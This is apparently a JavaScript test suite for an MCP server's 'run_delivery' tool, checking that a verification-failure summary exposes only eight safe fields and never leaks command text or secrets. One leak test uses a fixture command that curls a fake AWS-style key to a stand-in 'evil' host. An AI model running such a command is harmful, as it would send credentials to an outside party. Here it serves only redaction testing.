// test/m11-12b-verificationSummary.test.js
//
// M11-12B: verification-failure summary closeout for run_delivery.
//
// When a delivery verification command fails, a Lead can see a small SAFE
// FACTUAL summary in run_delivery and identify which declared check failed —
// WITHOUT command text, stdout/stderr content, signal, paths, env, credentials,
// provider payloads, prompts, or dynamic errors crossing the boundary.
//
// The summary is a single nullable field `verificationFailureSummary` on the
// standard run_delivery output, shared by the point-in-time query and the
// waitMs readiness handshake. Non-null ONLY when verificationStatus === "failed".
// Exact eight safe scalar fields:
//   code, failedCommandIndex, declaredCommandCount, executedCommandCount,
//   exitCode, timedOut, stdoutBytes, stderrBytes
//
// This file establishes REAL REDs (then GREENs) for the CTO correction findings:
//   A. Windows exit codes: preserve nonnegative 32-bit (incl. 9009); reject/null
//      negative, fractional, non-number, and > 0xffffffff.
//   B. Result identity: per-command fields project ONLY from
//      results[failedCommandIndex] when it is a plain object whose result.index
//      is an integer exactly equal to failedCommandIndex. On mismatch/missing/
//      malformed, keep counts/index/code safe but null the four per-command
//      fields.
//   C. Failure-code consistency: for verificationStatus=failed the raw
//      failureCode projects through the existing safe closed set; missing/
//      invalid/unknown yields the same safe "unknown" in BOTH top-level
//      verificationFailureCode AND summary.code. Non-failed states are null.
//   D. Boundary shape: exact eight-key object; strict schema; wire-visible
//      nullable field shared by point-in-time + waitMs.
//
// Preservation: point-in-time vs waitMs equivalence, malformed-data safety,
// huge counts, secret/control non-leakage, no raw command/results/output echo,
// and non-failed states remain null.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { createWaoMcpServer, projectVerificationFailureSummary } from "../src/mcp/server.js";

// ===== Helpers =====

const EXACT_SUMMARY_KEYS = [
  "code",
  "failedCommandIndex",
  "declaredCommandCount",
  "executedCommandCount",
  "exitCode",
  "timedOut",
  "stdoutBytes",
  "stderrBytes",
];

/** A failed verification object shaped like verifyDelivery's real output. */
function failedVerification(over = {}) {
  return {
    status: "failed",
    commands: ["npm test", "npm run build"],
    verifiedCommit: "d".repeat(40),
    timeoutMs: 300000,
    results: [
      { index: 0, command: "npm test", exitCode: 0, signal: null, timedOut: false, durationMs: 100, stdoutBytes: 50, stderrBytes: 0 },
      { index: 1, command: "npm run build", exitCode: 2, signal: null, timedOut: false, durationMs: 50, stdoutBytes: 10, stderrBytes: 200 },
    ],
    failureCode: "command_failed",
    failedCommandIndex: 1,
    ...over,
  };
}

/** A full deliveryRef carrying a failed verification. */
function failedRef(over = {}) {
  return {
    deliveryCommit: "d".repeat(40),
    baseCommit: "b".repeat(40),
    changedFiles: ["src/a.js"],
    verification: failedVerification(),
    ...over,
  };
}

/** A run_delivery service view with a failed delivery. */
function failedView(runId = "run_x", refOver = {}, viewOver = {}) {
  return {
    runId,
    terminalState: "completed",
    deliveryAvailable: true,
    deliveryRequested: true,
    deliveryRef: failedRef(refOver),
    verification: { status: "failed", failureCode: "command_failed" },
    acceptance: { status: "pending" },
    ...viewOver,
  };
}

function cleanupDir(dir) {
  try { rmSync(dir, { recursive: true, force: true }); } catch { /* best effort */ }
}

async function buildInMemoryClient(server) {
  const { Client } = await import("@modelcontextprotocol/sdk/client");
  const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");
  const client = new Client({ name: "wao-m11-12b", version: "0.0.1" }, { capabilities: {} });
  const [ct, st] = InMemoryTransport.createLinkedPair();
  await Promise.all([server.connect(st), client.connect(ct)]);
  return client;
}

async function callDelivery(server, args) {
  const client = await buildInMemoryClient(server);
  try {
    const res = await client.callTool({ name: "run_delivery", arguments: args });
    return res;
  } finally {
    await client.close();
    await server.close();
  }
}

// =====================================================================
// A. Windows exit codes (finding A)
// =====================================================================

test("M11-12B-A1: Windows exit code 9009 preserved verbatim (not clamped to POSIX 0..255)", () => {
  // RED on a POSIX-masked implementation: 9009 would collapse to 137 (9009 & 0xff)
  // or be rejected as ">255". GREEN: nonnegative 32-bit preserved exactly.
  const ref = failedRef({
    verification: failedVerification({
      results: [
        { index: 0, command: "x", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 },
        { index: 1, command: "missing-cmd", exitCode: 9009, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 19 },
      ],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.exitCode, 9009, "9009 (Windows command-not-found) must be preserved exactly");
  assert.equal(s.stderrBytes, 19);
});

test("M11-12B-A2: boundary exit codes 0 and 0xffffffff (4294967295) preserved", () => {
  for (const code of [0, 0xffffffff, 4294967295, 1, 255, 256, 65535]) {
    const ref = failedRef({
      verification: failedVerification({
        failedCommandIndex: 0,
        results: [{ index: 0, command: "x", exitCode: code, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 }],
      }),
    });
    const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
    assert.equal(s.exitCode, code, `exitCode ${code} must be preserved (nonnegative 32-bit)`);
  }
});

test("M11-12B-A3: negative exit code → null", () => {
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 0,
      results: [{ index: 0, command: "x", exitCode: -1, signal: null, timedOut: false, stdoutBytes: 1, stderrBytes: 2 }],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.exitCode, null, "negative exit code must null");
  // Per-command siblings still project (the result object itself was valid).
  assert.equal(s.stdoutBytes, 1);
  assert.equal(s.stderrBytes, 2);
  assert.equal(s.timedOut, false);
});

test("M11-12B-A4: fractional exit code → null", () => {
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 0,
      results: [{ index: 0, command: "x", exitCode: 1.5, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 }],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.exitCode, null, "fractional exit code must null");
});

test("M11-12B-A5: non-number exit code (string/null/bool/object) → null", () => {
  for (const bad of ["2", null, undefined, true, false, {}, [], NaN]) {
    const ref = failedRef({
      verification: failedVerification({
        failedCommandIndex: 0,
        results: [{ index: 0, command: "x", exitCode: bad, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 }],
      }),
    });
    const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
    assert.equal(s.exitCode, null, `non-number exit code ${JSON.stringify(bad)} must null`);
  }
});

test("M11-12B-A6: exit code above 0xffffffff → null", () => {
  for (const over of [0x100000000, 4294967296, 2147483648 * 2]) {
    const ref = failedRef({
      verification: failedVerification({
        failedCommandIndex: 0,
        results: [{ index: 0, command: "x", exitCode: over, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 }],
      }),
    });
    const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
    assert.equal(s.exitCode, null, `exit code ${over} (> 0xffffffff) must null`);
  }
});

test("M11-12B-A7: Windows 9009 preserved end-to-end through the MCP adapter (wire-visible)", async () => {
  const server = createWaoMcpServer({
    registryPath: "/r.json", runDir: "/runs",
    getRunDeliveryFn: async () => failedView("run_x", {
      verification: failedVerification({
        results: [
          { index: 0, command: "npm test", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 50, stderrBytes: 0 },
          { index: 1, command: "missing-cmd", exitCode: 9009, signal: null, timedOut: false, stdoutBytes: 10, stderrBytes: 200 },
        ],
      }),
    }),
  });
  const res = await callDelivery(server, { runId: "run_x" });
  assert.equal(res.isError, undefined);
  const sc = res.structuredContent;
  assert.equal(sc.verificationFailureSummary.exitCode, 9009, "wire output preserves Windows 9009");
  assert.equal(sc.verificationFailureSummary.failedCommandIndex, 1);
});

// =====================================================================
// B. Result identity (finding B)
// =====================================================================

test("M11-12B-B1: valid result with result.index === failedCommandIndex projects per-command fields", () => {
  const ref = failedRef();
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.failedCommandIndex, 1);
  assert.equal(s.exitCode, 2);
  assert.equal(s.timedOut, false);
  assert.equal(s.stdoutBytes, 10);
  assert.equal(s.stderrBytes, 200);
  assert.equal(s.declaredCommandCount, 2);
  assert.equal(s.executedCommandCount, 2);
});

test("M11-12B-B2: result.index mismatch → null per-command fields, counts/index/code preserved", () => {
  // failedCommandIndex=1, but results[1].index=2 → identity mismatch.
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 1,
      results: [
        { index: 0, command: "a", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 1, stderrBytes: 1 },
        { index: 2, command: "b", exitCode: 5, signal: null, timedOut: false, stdoutBytes: 9, stderrBytes: 9 },
      ],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  // counts/index/code stay safe.
  assert.equal(s.code, "command_failed");
  assert.equal(s.failedCommandIndex, 1);
  assert.equal(s.declaredCommandCount, 2);
  assert.equal(s.executedCommandCount, 2);
  // the four per-command result fields null.
  assert.equal(s.exitCode, null, "exitCode nulled on result.index mismatch");
  assert.equal(s.timedOut, null);
  assert.equal(s.stdoutBytes, null);
  assert.equal(s.stderrBytes, null);
});

test("M11-12B-B3: results[failedCommandIndex] missing → null per-command fields, counts/index/code preserved", () => {
  // failedCommandIndex=1 but results has only one entry (index 0).
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 1,
      results: [{ index: 0, command: "a", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 1, stderrBytes: 1 }],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.failedCommandIndex, 1);
  assert.equal(s.declaredCommandCount, 2);
  assert.equal(s.executedCommandCount, 1);
  assert.equal(s.exitCode, null);
  assert.equal(s.timedOut, null);
  assert.equal(s.stdoutBytes, null);
  assert.equal(s.stderrBytes, null);
});

test("M11-12B-B4: result.index non-integer (1.5) → identity mismatch → nulls", () => {
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 1,
      results: [
        { index: 0, command: "a", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 },
        { index: 1.5, command: "b", exitCode: 7, signal: null, timedOut: false, stdoutBytes: 3, stderrBytes: 3 },
      ],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.failedCommandIndex, 1);
  assert.equal(s.exitCode, null);
  assert.equal(s.stdoutBytes, null);
  assert.equal(s.stderrBytes, null);
  assert.equal(s.timedOut, null);
});

test("M11-12B-B5: result not a plain object (string/number) → nulls, counts/index/code safe", () => {
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 1,
      results: ["not-an-object", 42],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.code, "command_failed");
  assert.equal(s.failedCommandIndex, 1);
  assert.equal(s.executedCommandCount, 2);
  assert.equal(s.exitCode, null);
  assert.equal(s.timedOut, null);
  assert.equal(s.stdoutBytes, null);
  assert.equal(s.stderrBytes, null);
});

test("M11-12B-B6: failedCommandIndex itself invalid → null index + null per-command fields; counts/code safe", () => {
  for (const bad of [1.5, -1, "1", null, undefined, true, {}, NaN]) {
    const ref = failedRef({
      verification: failedVerification({
        failedCommandIndex: bad,
        results: [{ index: 0, command: "a", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 1, stderrBytes: 1 }],
      }),
    });
    const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
    assert.equal(s.failedCommandIndex, null, `invalid failedCommandIndex ${JSON.stringify(bad)} → null`);
    assert.equal(s.exitCode, null);
    assert.equal(s.timedOut, null);
    assert.equal(s.stdoutBytes, null);
    assert.equal(s.stderrBytes, null);
    // counts/code remain safe regardless.
    assert.equal(s.code, "command_failed");
    assert.equal(s.declaredCommandCount, 2);
    assert.equal(s.executedCommandCount, 1);
  }
});

// =====================================================================
// C. Failure-code consistency (finding C)
// =====================================================================

test("M11-12B-C1: failed + valid failureCode → same code in verificationFailureCode AND summary.code (MCP)", async () => {
  const server = createWaoMcpServer({
    registryPath: "/r.json", runDir: "/runs",
    getRunDeliveryFn: async () => failedView("run_x", {}, {
      verification: { status: "failed", failureCode: "command_timeout" },
    }),
  });
  const res = await callDelivery(server, { runId: "run_x" });
  const sc = res.structuredContent;
  assert.equal(sc.verificationStatus, "failed");
  assert.equal(sc.verificationFailureCode, "command_timeout");
  assert.equal(sc.verificationFailureSummary.code, "command_timeout",
    "summary.code must equal the top-level verificationFailureCode");
});

test("M11-12B-C2: failed + MISSING failureCode → 'unknown' in BOTH fields (MCP)", async () => {
  // RED on prior HEAD: top-level verificationFailureCode was null when the raw
  // failureCode was absent, even for failed status. Finding C: both must be
  // the safe "unknown".
  const server = createWaoMcpServer({
    registryPath: "/r.json", runDir: "/runs",
    getRunDeliveryFn: async () => failedView("run_x", {
      verification: failedVerification({ failureCode: undefined }),
    }, {
      verification: { status: "failed" }, // no failureCode on the minimal view either
    }),
  });
  const res = await callDelivery(server, { runId: "run_x" });
  const sc = res.structuredContent;
  assert.equal(sc.verificationStatus, "failed");
  assert.equal(sc.verificationFailureCode, "unknown", "missing failureCode on failed → unknown (not null)");
  assert.ok(sc.verificationFailureSummary, "summary present on failed");
  assert.equal(sc.verificationFailureSummary.code, "unknown",
    "summary.code must also be unknown — same projection as top-level");
});

test("M11-12B-C3: failed + INVALID failureCode → 'unknown' in BOTH fields (MCP)", async () => {
  const server = createWaoMcpServer({
    registryPath: "/r.json", runDir: "/runs",
    getRunDeliveryFn: async () => failedView("run_x", {}, {
      verification: { status: "failed", failureCode: "AKIA-LEAK-NOT-A-CODE" },
    }),
  });
  const res = await callDelivery(server, { runId: "run_x" });
  const sc = res.structuredContent;
  assert.equal(sc.verificationFailureCode, "unknown");
  assert.equal(sc.verificationFailureSummary.code, "unknown");
  // The raw invalid value must not leak.
  const dumped = JSON.stringify(res);
  assert.ok(!dumped.includes("AKIA"), "invalid failureCode must not leak verbatim");
});

test("M11-12B-C4: non-failed states → summary null AND verificationFailureCode null even if a code is present", async () => {
  // passed/pending/unavailable must never carry a failure summary or code, even
  // if a malformed ref carries a failureCode alongside a non-failed status.
  for (const status of ["passed", "pending", "unavailable"]) {
    const server = createWaoMcpServer({
      registryPath: "/r.json", runDir: "/runs",
      getRunDeliveryFn: async () => ({
        runId: "run_x",
        terminalState: "completed",
        deliveryAvailable: true,
        deliveryRequested: true,
        deliveryRef: {
          deliveryCommit: "d".repeat(40), baseCommit: "b".repeat(40), changedFiles: ["src/a.js"],
          verification: failedVerification({ status }), // non-failed status + a failureCode present
        },
        verification: { status, failureCode: "command_failed" }, // malformed: code on non-failed
        acceptance: { status: "pending" },
      }),
    });
    const res = await callDelivery(server, { runId: "run_x" });
    const sc = res.structuredContent;
    assert.equal(sc.verificationStatus, status);
    assert.equal(sc.verificationFailureSummary, null, `${status}: summary must be null`);
    assert.equal(sc.verificationFailureCode, null, `${status}: top-level code must be null (non-failed)`);
  }
});

// =====================================================================
// D. Boundary shape (finding D): exact 8 keys + strict nullable schema
// =====================================================================

test("M11-12B-D1: summary projects EXACTLY the eight safe keys (no more, no less)", () => {
  const s = projectVerificationFailureSummary(failedRef(), "failed", "command_failed");
  assert.deepEqual(Object.keys(s).sort(), EXACT_SUMMARY_KEYS.slice().sort(),
    `summary must have exactly the eight keys; got ${Object.keys(s).sort()}`);
});

test("M11-12B-D1b: malformed verification object still yields exactly the eight keys, fails safe", () => {
  // ref present but verification missing entirely.
  const s1 = projectVerificationFailureSummary({ deliveryCommit: "d".repeat(40) }, "failed", "command_failed");
  assert.deepEqual(Object.keys(s1).sort(), EXACT_SUMMARY_KEYS.slice().sort());
  assert.equal(s1.code, "command_failed");
  assert.equal(s1.failedCommandIndex, null);
  assert.equal(s1.declaredCommandCount, null);
  assert.equal(s1.executedCommandCount, null);
  assert.equal(s1.exitCode, null);
  // ref itself null.
  const s2 = projectVerificationFailureSummary(null, "failed", "command_failed");
  assert.deepEqual(Object.keys(s2).sort(), EXACT_SUMMARY_KEYS.slice().sort());
  assert.equal(s2.code, "command_failed");
});

test("M11-12B-D2: outputSchema declares verificationFailureSummary as a nullable strict 8-key object", async () => {
  const server = createWaoMcpServer({ registryPath: "/r.json", runDir: "/runs" });
  const client = await buildInMemoryClient(server);
  try {
    const tools = await client.listTools();
    const rd = tools.tools.find((t) => t.name === "run_delivery");
    const field = rd.outputSchema?.properties?.verificationFailureSummary;
    assert.ok(field, "run_delivery outputSchema must declare verificationFailureSummary");
    // Nullable: resolves to anyOf/oneOf with an object branch + a null branch.
    const branches = field.type === "object" ? [field] : (field.anyOf ?? field.oneOf ?? []);
    const objBranch = branches.find((b) => b.type === "object");
    const nullBranch = branches.find((b) => b.type === "null" || b.const === null);
    assert.ok(objBranch, "summary declares an object branch");
    assert.ok(nullBranch, "summary declares a null branch (nullable)");
    // Strict: exactly the eight properties, additionalProperties false.
    const propNames = Object.keys(objBranch.properties ?? {}).sort();
    assert.deepEqual(propNames, EXACT_SUMMARY_KEYS.slice().sort(),
      `schema object branch must declare exactly the eight keys; got ${propNames}`);
    assert.equal(objBranch.additionalProperties, false, "summary schema must be strict (additionalProperties:false)");
  } finally {
    await client.close();
    await server.close();
  }
});

test("M11-12B-D3: point-in-time and waitMs paths both carry the SAME summary (equivalence)", async () => {
  const dir = mkdtempSync(join(tmpdir(), "m11-12b-d3-"));
  try {
    // Make a real git repo (with a commit) so the waitMs workspace binding resolves.
    const { execSync } = await import("node:child_process");
    const { writeFileSync } = await import("node:fs");
    execSync("git init -q", { cwd: dir, stdio: "ignore" });
    execSync('git config user.email "t@t"', { cwd: dir, stdio: "ignore" });
    execSync('git config user.name "t"', { cwd: dir, stdio: "ignore" });
    writeFileSync(join(dir, "R.md"), "x\n");
    execSync("git add -A && git commit -q -m i", { cwd: dir, stdio: "ignore" });

    const view = failedView("run_x", {
      verification: failedVerification({
        results: [
          { index: 0, command: "npm test", exitCode: 0, signal: null, timedOut: false, stdoutBytes: 5, stderrBytes: 0 },
          { index: 1, command: "npm run build", exitCode: 9009, signal: null, timedOut: false, stdoutBytes: 8, stderrBytes: 200 },
        ],
      }),
    });

    // Point-in-time.
    const serverPit = createWaoMcpServer({
      registryPath: "/r.json", runDir: "/runs", workspaceRoot: dir,
      getRunDeliveryFn: async () => view,
    });
    const pit = await callDelivery(serverPit, { runId: "run_x" });

    // waitMs path — readiness=reviewable settles immediately (waitReturnedEarly).
    const serverWait = createWaoMcpServer({
      registryPath: "/r.json", runDir: "/runs", workspaceRoot: dir,
      getRunDeliveryReadinessFn: async () => ({
        runId: "run_x", readiness: "reviewable", waitReturnedEarly: true,
        terminalState: "completed", deliveryAvailable: true, deliveryRequested: true,
        deliveryRef: view.deliveryRef, deliveryFailure: null,
        verification: view.verification, acceptance: view.acceptance,
      }),
    });
    const wait = await callDelivery(serverWait, { runId: "run_x", waitMs: 2000 });

    assert.equal(pit.structuredContent.verificationFailureSummary.exitCode, 9009);
    assert.deepEqual(
      wait.structuredContent.verificationFailureSummary,
      pit.structuredContent.verificationFailureSummary,
      "waitMs and point-in-time must carry the identical summary",
    );
    assert.equal(wait.structuredContent.readiness, "reviewable");
  } finally {
    cleanupDir(dir);
  }
});

// =====================================================================
// Preservation: non-leakage, malformed safety, huge counts, no raw expansion
// =====================================================================

test("M11-12B-P1: summary is null for passed/pending/unavailable and absent-verification (point-in-time)", async () => {
  for (const status of ["passed", "pending", "unavailable"]) {
    const server = createWaoMcpServer({
      registryPath: "/r.json", runDir: "/runs",
      getRunDeliveryFn: async () => ({
        runId: "run_x", terminalState: "completed",
        deliveryAvailable: true, deliveryRequested: true,
        deliveryRef: {
          deliveryCommit: "d".repeat(40), baseCommit: "b".repeat(40), changedFiles: ["src/a.js"],
          verification: { status },
        },
        verification: { status },
        acceptance: { status: "pending" },
      }),
    });
    const res = await callDelivery(server, { runId: "run_x" });
    assert.equal(res.structuredContent.verificationFailureSummary, null, `${status}: summary null`);
  }
});

test("M11-12B-P2: NO command text / stdout-stderr content / signal / results leak through the wire", async () => {
  const SECRET = "AKIASECRET123";
  const server = createWaoMcpServer({
    registryPath: "/r.json", runDir: "/runs",
    getRunDeliveryFn: async () => failedView("run_x", {
      verification: failedVerification({
        commands: [`npm test --token=${SECRET}`, `curl http://evil/${SECRET}`],
        results: [
          { index: 0, command: `npm test --token=${SECRET}`, exitCode: 0, signal: "SIGFAKE", timedOut: false, stdoutBytes: 11, stderrBytes: 0 },
          { index: 1, command: `curl http://evil/${SECRET}`, exitCode: 9009, signal: null, timedOut: false, stdoutBytes: 3, stderrBytes: 200 },
        ],
      }),
    }),
  });
  const res = await callDelivery(server, { runId: "run_x" });
  const dumped = JSON.stringify(res);
  // The summary exposes byte COUNTS, not content.
  assert.equal(res.structuredContent.verificationFailureSummary.stdoutBytes, 3);
  assert.equal(res.structuredContent.verificationFailureSummary.stderrBytes, 200);
  // No command text, secret, signal, or raw results array may cross the boundary.
  assert.ok(!dumped.includes(SECRET), "secret in command must not leak");
  assert.ok(!dumped.includes("npm test"), "command text must not leak");
  assert.ok(!dumped.includes("curl http"), "command text must not leak");
  assert.ok(!dumped.includes("SIGFAKE"), "signal must not leak");
  assert.ok(!dumped.includes('"results"'), "raw results array must not be echoed");
  assert.ok(!dumped.includes("verifiedCommit"), "verifiedCommit must not leak");
  assert.ok(!dumped.includes("timeoutMs"), "timeoutMs must not leak");
});

test("M11-12B-P3: huge declared/executed counts project as safe nonnegative integers", () => {
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 0,
      commands: new Array(5000).fill("x"),
      results: [{ index: 0, command: "x", exitCode: 1, signal: null, timedOut: false, stdoutBytes: 0, stderrBytes: 0 }],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.declaredCommandCount, 5000);
  assert.equal(s.executedCommandCount, 1);
  assert.equal(s.failedCommandIndex, 0);
});

test("M11-12B-P4: malformed commands/results (non-array) → counts null, no throw, code/index safe", () => {
  const ref = failedRef({
    verification: failedVerification({
      commands: "not-an-array",
      results: { not: "an-array" },
      failedCommandIndex: 0,
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "execution_error");
  assert.equal(s.code, "execution_error");
  assert.equal(s.declaredCommandCount, null, "non-array commands → null count");
  assert.equal(s.executedCommandCount, null, "non-array results → null count");
  assert.equal(s.failedCommandIndex, 0);
  assert.equal(s.exitCode, null);
  assert.equal(s.timedOut, null);
  assert.equal(s.stdoutBytes, null);
  assert.equal(s.stderrBytes, null);
});

test("M11-12B-P5: stdoutBytes/stderrBytes/durationMs non-integer or negative → null (no partial leak)", () => {
  const ref = failedRef({
    verification: failedVerification({
      failedCommandIndex: 0,
      results: [{ index: 0, command: "x", exitCode: 0, signal: null, timedOut: false, stdoutBytes: -5, stderrBytes: 1.5 }],
    }),
  });
  const s = projectVerificationFailureSummary(ref, "failed", "command_failed");
  assert.equal(s.stdoutBytes, null, "negative byte count → null");
  assert.equal(s.stderrBytes, null, "fractional byte count → null");
});

test("M11-12B-P6: timedOut projected strictly as boolean; non-boolean → null", () => {
  for (const [val, want] of [[true, true], [false, false], ["true", null], [1, null], [null, null], [undefined, null]]) {
    const ref = failedRef({
      verification: failedVerification({
        failedCommandIndex: 0,
        results: [{ index: 0, command: "x", exitCode: 0, signal: null, timedOut: val, stdoutBytes: 0, stderrBytes: 0 }],
      }),
    });
    const s = projectVerificationFailureSummary(ref, "failed", "command_timeout");
    assert.equal(s.timedOut, want, `timedOut ${JSON.stringify(val)} → ${want}`);
  }
});

test("M11-12B-P7: full run_delivery output for a failed delivery has the exact expected wire field set", async () => {
  const server = createWaoMcpServer({
    registryPath: "/r.json", runDir: "/runs",
    getRunDeliveryFn: async () => failedView("run_x"),
  });
  const res = await callDelivery(server, { runId: "run_x" });
  const parsed = res.structuredContent;
  // Point-in-time field set now includes verificationFailureSummary.
  // M12-1S1/M12-4A: add nullable candidateInventory + candidateKind.
  const expectedKeys = new Set([
    "runId", "deliveryAvailable", "deliveryRequested", "terminalState", "baseCommit", "deliveryCommit",
    "changedFileCount", "changedPaths", "changedPathsTruncated",
    "verificationStatus", "verificationFailureCode", "verificationFailureSummary",
    "acceptanceStatus", "decisionType", "deliveryFailure", "candidateInventory", "candidateKind",
  ]);
  assert.deepEqual(new Set(Object.keys(parsed)), expectedKeys,
    `wire field set mismatch; got ${Object.keys(parsed).sort()}`);
});
